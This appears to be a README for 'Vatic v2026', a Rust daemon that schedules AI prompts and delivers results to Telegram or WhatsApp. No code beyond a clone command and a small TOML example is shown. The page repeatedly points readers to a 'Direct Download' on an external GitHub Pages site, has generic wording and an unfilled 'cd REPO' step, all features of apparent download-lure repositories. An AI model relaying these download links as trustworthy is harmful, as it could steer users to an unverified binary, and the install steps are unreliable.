# Vatic v2026 - AI prompt scheduler 2026

> **Vatic is a Rust daemon built to plan AI prompt workflows with TOML config, container-isolated execution, and delivery to messaging channels like Telegram and WhatsApp.**

[![Platform](https://img.shields.io/badge/Platform-Rust%20daemon-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ethan-jamesqyw8863/vatic-prompt-workflow-hub?style=flat-square)](https://github.com/ethan-jamesqyw8863/vatic-prompt-workflow-hub)

---

<p align="center">
  <a href="https://ethan-jamesqyw8863.github.io/vatic-prompt-workflow-hub/">
    <img src="https://img.shields.io/badge/Download-Vatic%20Latest-brightgreen?style=for-the-badge" alt="Download Vatic">
  </a>
</p>

> **[Direct Download - Vatic v2026](https://ethan-jamesqyw8863.github.io/vatic-prompt-workflow-hub/)**

---

[Download Latest Build](https://ethan-jamesqyw8863.github.io/vatic-prompt-workflow-hub/)

---

## What Vatic Does

Vatic automates prompt-driven AI routines by running them as scheduled daemon jobs. It is suited to environments where tasks need to repeat reliably, follow a predictable timeline, and remain easy to track through a clear configuration file.

The workflow is managed through TOML, which keeps prompt definitions, delivery settings, and execution behavior in one structured place rather than embedding them in code. That makes Vatic a practical service layer for teams and operators who want prompt automation plus message delivery without extra complexity.

---

## Capabilities

- Runs and schedules AI prompts at a chosen interval
- Relies on TOML files for simple, readable setup
- Executes prompt jobs inside isolated containers
- Delivers messages through Telegram
- Delivers messages through WhatsApp
- Coordinates automated prompt workflows
- Implemented as a Rust daemon for ongoing background operation
- Suited to scheduling-centric and messaging-driven automation

---

## Installation

Clone the repository and either build it locally or use the artifact for your platform:

```bash
git clone https://github.com/ethan-jamesqyw8863/vatic-prompt-workflow-hub.git
cd REPO
```

For local builds, start the daemon after you have finished configuration. If you prefer a packaged release, download the latest build from the project page and run it from the unpacked directory.

---

## Usage

1. Create or update the TOML configuration file.
2. Set the prompt timing, container execution parameters, and message delivery destinations.
3. Launch the daemon so it can handle jobs in the background.
4. Check the configured messaging channel for delivery output.

Example workflow:

```bash
./vatic --config config.toml
```

If your build uses another startup command, pass it the same TOML file and run the service in the mode required by your environment.

---

## Configuration

Vatic reads its settings from TOML. In a typical deployment, scheduling, execution, and messaging options stay together in one file so the daemon can load the full setup consistently at startup.

Example layout:

```toml
[scheduler]
interval = "15m"

[execution]
mode = "container"

[delivery.telegram]
enabled = true

[delivery.whatsapp]
enabled = false
```

Tune the values to fit your prompt cadence, container runtime behavior, and preferred delivery path.

---

## Requirements

- Rust runtime or compiled binary for your target platform
- TOML configuration file
- Container support for isolated execution
- Network access for message delivery integrations
- Telegram or WhatsApp account/channel details if those delivery options are enabled

---

## FAQ

**How can I adjust the schedule?**  
Change the relevant TOML values and then restart or reload the daemon based on how you deploy it.

**Where are messaging channels defined?**  
The configuration file contains the channel settings, including delivery options for Telegram and WhatsApp.

**What if jobs are not starting?**  
Verify that the daemon is running, the TOML file parses correctly, container execution is available, and the schedule values are set as intended.

**How do I apply updates?**  
Download the latest build or fetch the newest source revision, then redeploy your configuration with the updated release.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
